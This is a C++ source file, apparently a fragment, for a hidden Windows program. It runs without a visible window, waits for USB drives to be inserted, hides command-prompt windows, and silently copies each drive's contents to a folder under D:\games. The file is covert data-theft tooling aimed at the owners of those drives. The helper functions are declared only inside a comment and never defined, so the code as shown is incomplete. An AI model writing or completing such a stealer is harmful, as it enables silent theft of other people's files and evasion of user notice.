#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
using namespace std;

unsigned char i;
bool active;
int usbnums;
char src[20] = "X:\\";
char dest[20] = "D:\\games\\files[X]\\";
char dest0[20] = "D:\\games\\files[0]\\";
char usbname[20];
vector<string> usbnames;

HANDLE hthread_stare = NULL;
HANDLE hthread_hide = NULL;
HANDLE husb = NULL;
UINT DiskType;

/*-------------------------------------------------------------------------------------------
DWORD WINAPI hide(LPVOID);		//hide线程搜索cmd窗口，一旦发现即对其进行隐藏
DWORD WINAPI stare(LPVOID);		//stare监视U盘，一旦退出active成false
void copy(bool default_dest);		//处理默认"可移动磁盘",统一丢入file[0], 有名字的丢入file[i]
bool checkusbname();			//同名的U盘不处理
int checkusb();				//只能复制第一个插入的U盘
--------------------------------------------------------------------------------------------*/

int main() {

	usbnums = 0;

	while (true) {				
		sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
		if (checkusb()) {
			active = true;
			CreateThread(NULL, 0, stare, NULL, 0, NULL);
			GetVolumeInformation(src, usbname, 20, NULL, NULL, NULL, NULL, NULL);
			string defaultname = usbname;
			if (defaultname == "") {
				CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy(true);
			} else if (checkusbname()) {
				CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy(false);
				usbnames.push_back(usbname);
			}
			while (active)
				Sleep(5000);
		} else {
			Sleep(5000);
		}
			
	}
	return 0;
}
